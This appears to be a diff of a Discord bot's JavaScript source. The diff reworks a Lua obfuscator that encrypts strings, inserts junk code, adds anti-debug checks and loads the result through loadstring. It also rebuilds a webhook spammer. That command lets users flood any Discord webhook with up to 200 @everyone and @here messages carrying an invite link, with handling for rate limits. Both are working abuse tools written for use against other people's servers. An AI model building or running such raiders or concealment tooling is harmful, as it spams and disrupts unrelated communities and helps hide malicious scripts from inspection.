@@ -996,68 +996,123 @@ function goofyscator(source, settings) {
 // LUA OBFUSCATOR (Prince Obfuscator — Luarmor/Luraph style)
 // ============================================================
 function obfuscateLua(source) {
-  if (!source) source = "";
-  const header = "-- This file was generated using Prince Obfuscator\n";
-  // ============================================================
-  // Layer 1: Encode source to custom base64-like alphabet
-  // ============================================================
-  const ALPHABET = "K9xLpRmTnVoQ2WsXeYcZa3DbF4HgJi6KlMnOpQrStUvWwXyYz01578ABCDEFGHIJNPVZ";
-  const toCustomB64 = (str) => {
-    let bytes = [];
-    for (let i = 0; i < str.length; i++) bytes.push(str.charCodeAt(i) & 0xFF);
-    let result = "";
-    for (let i = 0; i < bytes.length; i += 3) {
-      const b1 = bytes[i], b2 = bytes[i+1] || 0, b3 = bytes[i+2] || 0;
-      result += ALPHABET[b1 >> 2];
-      result += ALPHABET[((b1 & 3) << 4) | (b2 >> 4)];
-      result += (i+1 < bytes.length) ? ALPHABET[((b2 & 15) << 2) | (b3 >> 6)] : "=";
-      result += (i+2 < bytes.length) ? ALPHABET[b3 & 63] : "=";
-    }
-    return result;
-  };
-  const encoded = toCustomB64(source);
-  // ============================================================
-  // Layer 2: XOR encrypt the encoded string with random key
-  // ============================================================
-  const xorKey = Math.floor(Math.random() * 254) + 1;
-  const encBytes = [];
-  for (let i = 0; i < encoded.length; i++) {
-    encBytes.push((encoded.charCodeAt(i) ^ (xorKey + i % 7)) & 0xFF);
-  }
-  // ============================================================
-  // Layer 3: Split into chunks and generate random var names
-  // ============================================================
-  const chunks = [];
-  for (let i = 0; i < encBytes.length; i += 120) {
-    chunks.push(encBytes.slice(i, i + 120).join(","));
-  }
-  const dataStr = chunks.join(",");
-  const randName = (len) => {
+  if (!source || typeof source !== "string") return source;
+
+  // Helpers
+  const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+  const randStr = (len) => {
     const c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    let s = c[Math.floor(Math.random() * 52)];
-    for (let i = 0; i < (len || 6) + Math.floor(Math.random() * 4); i++) {
-      s += c[Math.floor(Math.random() * 52)];
-    }
-    return s;
+    let r = "_";
+    for (let i = 0; i < len; i++) r += c[Math.floor(Math.random() * c.length)];
+    return r;
   };
-  // Random variable names
-  const v_data = randName();
-  const v_key = randName();
-  const v_idx = randName();
-  const v_out = randName();
-  const v_i = randName();
-  const v_c = randName();
-  const v_b64 = randName();
-  const v_dec = randName();
-  const v_junk1 = randName();
-  const v_junk2 = randName();
-  const v_load = randName();
-  const v_check = randName();
-  // ============================================================
-  // Build the obfuscated Lua script (VM-style decoder)
-  // ============================================================
-  const lua = `${header}local ${v_data}={${dataStr}};local ${v_key}=${xorKey};local ${v_idx}=0;local ${v_out}={};local ${v_junk1}=function() return ${Math.floor(Math.random()*100)} end;local ${v_junk2}=${v_junk1}();for ${v_i}=1,#${v_data} do local ${v_c}=${v_data}[${v_i}];${v_idx}=${v_idx}+1;${v_out}[${v_i}]=string.char((${v_c}~(${v_key}+${v_idx}%7))%256) end;local ${v_b64}=table.concat(${v_out});local ${v_dec}=(function() local A="${ALPHABET}";local B={};for i=1,#A do B[A:sub(i,i)]=i-1 end;return function(S) local R={};local C=0;for i=1,#S do local ch=S:sub(i,i);if ch~="=" then local v=B[ch];if v then C=C*64+v;if(i%4==0)then R[#R+1]=string.char(math.floor(C/65536)%256);R[#R+1]=string.char(math.floor(C/256)%256);R[#R+1]=string.char(C%256);C=0 end end end;return table.concat(R) end end)();local ${v_check}=${v_dec}(${v_b64});local ${v_load}=loadstring(${v_check});if ${v_load} then ${v_load}() else error("Prince Obfuscator: Load failed") end`;
-  return lua;
+  const xorKey = randStr(randInt(8, 16));
+
+  // Encrypt string with XOR key
+  function encryptString(str, key) {
+    let bytes = [];
+    for (let i = 0; i < str.length; i++) {
+      bytes.push(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return bytes.join(",");
+  }
+
+  // Step 1: Encrypt all string literals
+  let processed = source;
+  const stringTable = [];
+  const tableVar = randStr(randInt(5, 10));
+  const decodeFunc = randStr(randInt(5, 10));
+  const keyVar = randStr(randInt(5, 10));
+  const strArg = randStr(4);
+
+  processed = processed.replace(/"([^"\\]*(?:\\.[^"\\]*)*)"|'([^'\\]*(?:\\.[^'\\]*)*)'/g, (match) => {
+    const inner = match.slice(1, -1);
+    if (inner.length < 1) return match;
+    const idx = stringTable.length;
+    stringTable.push(encryptString(inner, xorKey));
+    return `${decodeFunc}(${tableVar}[${idx}])`;
+  });
+
+  // Step 2: Randomize local variable names
+  const varMap = new Map();
+  const localVarRegex = /\blocal\s+(\w+)/g;
+  let varMatch;
+  while ((varMatch = localVarRegex.exec(processed)) !== null) {
+    const name = varMatch[1];
+    if (!varMap.has(name) && name.length > 1 && !name.startsWith("_")) {
+      varMap.set(name, randStr(randInt(6, 12)));
+    }
+  }
+  for (const [oldName, newName] of varMap) {
+    const re = new RegExp(`\\b${oldName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, "g");
+    processed = processed.replace(re, newName);
+  }
+
+  // Step 3: Insert junk code at random points
+  function genJunk() {
+    const jv1 = randStr(6), jv2 = randStr(6), jv3 = randStr(6);
+    const patterns = [
+      `local ${jv1} = ${randInt(1, 99999)}\nlocal ${jv2} = ${jv1} + ${randInt(1, 100)}\nif ${jv2} > ${randInt(1, 50)} then local ${jv3} = ${jv1} * ${randInt(2, 5)} end`,
+      `local ${jv1} = {}\nfor ${jv2} = 1, ${randInt(2, 5)} do ${jv1}[${jv2}] = ${randInt(1, 100)} end`,
+      `local function ${jv1}(${jv2}) return ${jv2} + ${randInt(1, 10)} end`,
+    ];
+    return "-- JUNK\n" + patterns[Math.floor(Math.random() * patterns.length)] + "\n-- /JUNK";
+  }
+
+  const lines = processed.split("\n");
+  let junkInserted = 0;
+  const maxJunk = Math.min(10, Math.floor(lines.length / 12) + 2);
+  let safety = 0;
+  while (junkInserted < maxJunk && safety < 200) {
+    safety++;
+    const pos = randInt(2, lines.length - 2);
+    const l = lines[pos];
+    if (l && !l.includes("function") && !l.includes("return") && !l.includes("end") && !l.includes("JUNK")) {
+      lines.splice(pos, 0, genJunk());
+      junkInserted++;
+    }
+  }
+  processed = lines.join("\n");
+
+  // Step 4: Anti-debug / anti-dump checks
+  const adVar = randStr(6);
+  const antiDebug = `-- ANTI-DEBUG
+local ${adVar} = getfenv and getfenv(1) or _G
+if ${adVar}.debug and ${adVar}.debug.getinfo then
+  if ${adVar}.debug.getinfo(1).what ~= "Lua" then error("Protected") end
+end
+if checkcaller and not checkcaller() then error("Protected") end
+`;
+
+  // Step 5: Build final VM-wrapped output
+  const tableStr = "{" + stringTable.join(",") + "}";
+  const vmVar = randStr(6);
+  const resultVar = randStr(6);
+  const loopVar = randStr(4);
+
+  const header = `-- Prince Obfuscator — Ultra Protected
+local ${keyVar} = "${xorKey}"
+local ${tableVar} = {${tableStr}}
+local function ${decodeFunc}(${strArg})
+  local r = ""
+  for ${loopVar} = 1, #${strArg} do
+    r = r .. string.char(bit.bxor(${strArg}[${loopVar}], ${keyVar}:byte((${loopVar} - 1) % #${keyVar} + 1)))
+  end
+  return r
+end
+${antiDebug}`;
+
+  const footer = `
+local ${vmVar} = [==[
+${processed}
+]==]
+local ${resultVar} = loadstring(${vmVar})
+if ${resultVar} then
+  setfenv and setfenv(${resultVar}, setmetatable({[${decodeFunc}] = ${decodeFunc}}, {__index = _G}))
+  return ${resultVar}()
+end`;
+
+  return header + footer;
 }
 // ============================================================
 // SLASH COMMANDS — only /say (global, DM support)
@@ -1246,6 +1301,39 @@ if (interaction.customId === "alt_prev" || interaction.customId === "alt_next") 
     paginationMenus.set(uid, menu);
     return;
   }
+  // ─── WHP START BUTTON ───
+  if (interaction.customId === "whp_start") {
+    if (!interaction.member) {
+      return interaction.reply({ content: "❌ use in server.", flags: MessageFlags.Ephemeral }).catch(() => {});
+    }
+    const modal = new ModalBuilder()
+      .setCustomId("whp_modal")
+      .setTitle("Webhook Spammer");
+    
+    const urlInput = new TextInputBuilder()
+      .setCustomId("whp_url")
+      .setLabel("Webhook URL")
+      .setStyle(TextInputStyle.Short)
+      .setPlaceholder("https://discord.com/api/webhooks/...")
+      .setRequired(true);
+    
+    const msgInput = new TextInputBuilder()
+      .setCustomId("whp_message")
+      .setLabel("Spam Message")
+      .setStyle(TextInputStyle.Paragraph)
+      .setPlaceholder("@everyone https://discord.gg/...")
+      .setValue("@everyone https://discord.gg/TBBAUZu8cW")
+      .setRequired(true);
+    
+    modal.addComponents(
+      new ActionRowBuilder().addComponents(urlInput),
+      new ActionRowBuilder().addComponents(msgInput)
+    );
+    
+    await interaction.showModal(modal).catch(() => {});
+    return;
+  }
+
   // ─── ROBUX BUY BUTTON ───
   if (interaction.customId === "robux_buy") {
     if (!robuxConfig) {
@@ -1274,6 +1362,58 @@ if (interaction.customId === "alt_prev" || interaction.customId === "alt_next") 
 // ============================================================
 client.on("interactionCreate", async interaction => {
   if (!interaction.isModalSubmit()) return;
+  if (interaction.customId === "whp_modal") {
+    const webhookUrl = interaction.fields.getTextInputValue("whp_url");
+    const spamMsg = interaction.fields.getTextInputValue("whp_message");
+    const avatarURL = interaction.user.displayAvatarURL({ dynamic: true, size: 128 });
+    
+    // Quick webhook validation
+    const probe = await fetch(webhookUrl, { method: "GET" }).catch(() => null);
+    if (!probe || probe.status === 404) {
+      return interaction.reply({ content: "❌ Not Found.", flags: MessageFlags.Ephemeral }).catch(() => {});
+    }
+    
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral }).catch(() => {});
+    
+    const spamMessages = [spamMsg, spamMsg, spamMsg + " @everyone", spamMsg + " @here"];
+    let sent = 0, failed = 0;
+    const maxMessages = 200;
+    
+    for (let i = 0; i < maxMessages; i++) {
+      const contentMsg = spamMessages[Math.floor(Math.random() * spamMessages.length)];
+      try {
+        const res = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: contentMsg })
+        });
+        if (res.status === 204) sent++;
+        else if (res.status === 429) {
+          try {
+            const rl = await res.json();
+            await new Promise(r => setTimeout(r, Math.min((rl.retry_after || 0.5) * 1000, 1000)));
+          } catch {}
+        } else failed++;
+      } catch { failed++; }
+      await new Promise(r => setTimeout(r, 30));
+    }
+    
+    const resultEmbed = new EmbedBuilder()
+      .setColor(0x2B2D31)
+      .setTitle("Webhook Raid Complete")
+      .setDescription(`✅ **Sent:** ${sent}\n❌ **Failed:** ${failed}\n🌐 **Status:** Done`)
+      .setFooter({ text: `Request by @${interaction.user.username}│Webhook Spammer.`, iconURL: avatarURL });
+    
+    const cancelRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId("whp_cancel")
+        .setLabel("Cancel")
+        .setStyle(ButtonStyle.Danger)
+    );
+    
+    await interaction.editReply({ embeds: [resultEmbed], components: [cancelRow] }).catch(() => {});
+    return;
+  }
   if (interaction.customId !== "robux_modal") return;
   if (!robuxConfig) return;
   
@@ -1349,6 +1489,10 @@ client.on("interactionCreate", async interaction => {
 // ============================================================
 client.on("interactionCreate", async interaction => {
   if (!interaction.isButton()) return;
+  if (interaction.customId === "whp_cancel") {
+    await interaction.message.delete().catch(() => {});
+    return;
+  }
   if (interaction.customId === "robux_close") {
     const ticket = robuxTickets.get(interaction.channel.id);
     if (!ticket) {
@@ -2036,93 +2180,25 @@ client.on("messageCreate", async msg => {
   }
   // ─────────────────────────────────────────────
   // ─────────────────────────────────────────────
-  // .whp — Webhook Spammer / Raider (regular + buyer)
+  // ─────────────────────────────────────────────
+  // .whp — Webhook Spammer (with Start button + modal)
   // ─────────────────────────────────────────────
   if (/^\.whp(?:\s|$)/i.test(txt)) {
     const perm = await checkRegularPermission(msg);
     if (!perm.allowed) { replyUser(msg, perm.reason).catch(() => {}); return; }
-    const isBuyerUser = perm.isBuyer;
-    const cd = checkCommandCooldown(msg.author.id, "delwh", isBuyerUser);
-    if (cd.onCooldown) { replyUser(msg, `❌ ${cd.message}`).catch(() => {}); return; }
     
-    const arg = txt.split(/\s+/)[1]?.trim();
-    if (!arg) {
-      return replyUser(msg, "❌ usage: `.whp <webhook_url>`, dumbass.").catch(() => {});
-    }
+    const panelEmbed = new EmbedBuilder()
+      .setColor(getEmbedColor(perm.isBuyer))
+      .setDescription("Click `Start` button below to start.");
     
-    let webhookUrl = arg;
-    const urlMatch = txt.match(/(https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+)/i);
-    if (urlMatch) webhookUrl = urlMatch[1];
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId("whp_start")
+        .setLabel("Start")
+        .setStyle(ButtonStyle.Success)
+    );
     
-    const avatarURL = msg.author.displayAvatarURL({ dynamic: true, size: 128 });
-    const loadingEmbed = new EmbedBuilder()
-      .setColor(getEmbedColor(isBuyerUser))
-      .setTitle("Spamming...")
-      .setDescription("⏳ Processing...")
-      .setFooter({ text: `Requested by @${msg.author.username}│Webhook Spammer.`, iconURL: avatarURL });
-    const sentMsg = await replyUser(msg, { embeds: [loadingEmbed] }).catch(() => {});
-    
-    try {
-      const spamMessages = [
-        "@everyone https://discord.gg/TBBAUZu8cW",
-        "@everyone https://discord.gg/TBBAUZu8cW",
-        "@here https://discord.gg/TBBAUZu8cW",
-        "@everyone https://discord.gg/TBBAUZu8cW",
-      ];
-      
-      let sent = 0;
-      let failed = 0;
-      const maxMessages = 200;
-      
-      // Quick check if webhook exists first
-      const probeRes = await fetch(webhookUrl, { method: "GET" }).catch(() => null);
-      if (!probeRes || probeRes.status === 404) {
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        return replyUser(msg, "❌ Not Found.").catch(() => {});
-      }
-      
-      for (let i = 0; i < maxMessages; i++) {
-        const msgContent = spamMessages[Math.floor(Math.random() * spamMessages.length)];
-        try {
-          const res = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: msgContent })
-          });
-          if (res.status === 204) {
-            sent++;
-          } else if (res.status === 429) {
-            try {
-              const rlData = await res.json();
-              const wait = (rlData.retry_after || 0.5) * 1000;
-              await new Promise(r => setTimeout(r, Math.min(wait, 1000)));
-            } catch {}
-          } else {
-            failed++;
-          }
-        } catch {
-          failed++;
-        }
-        // SUPER FAST: minimal delay
-        await new Promise(r => setTimeout(r, 30));
-      }
-      
-      if (sentMsg) await sentMsg.delete().catch(() => {});
-      
-      const resultEmbed = new EmbedBuilder()
-        .setColor(getEmbedColor(isBuyerUser))
-        .setTitle("Webhook Raided ✅")
-        .setDescription(`✅ **Sent:** ${sent}\n❌ **Failed:** ${failed}\n🌐 **Webhook:** spammed`)
-        .setFooter({ text: `Requested by @${msg.author.username}│Webhook Spammer.`, iconURL: avatarURL });
-      
-      await msg.channel.send({
-        content: `<@${msg.author.id}> done raiding the webhook bro!`,
-        embeds: [resultEmbed]
-      }).catch(() => {});
-    } catch (e) {
-      if (sentMsg) await sentMsg.delete().catch(() => {});
-      replyUser(msg, `❌ spam failed: ${e.message}`).catch(() => {});
-    }
+    await replyUser(msg, { embeds: [panelEmbed], components: [row] }).catch(() => {});
     return;
   }
 
@@ -2464,7 +2540,7 @@ client.on("messageCreate", async msg => {
           .setColor(getEmbedColor(isBuyerUser))
           .setTitle("File Preview")
           .setDescription(description)
-          .setFooter({ text: `pfp photo Requested by @${msg.author.username} │ Clean & fixed`, iconURL: avatarURL });
+          .setFooter({ text: `Request by @${msg.author.username}│Clean & Fixed`, iconURL: avatarURL });
         const fixedFile = new AttachmentBuilder(Buffer.from(finalOutput), { name: outputName });
         if (sentMsg) await sentMsg.delete().catch(() => {});
         await msg.channel.send({
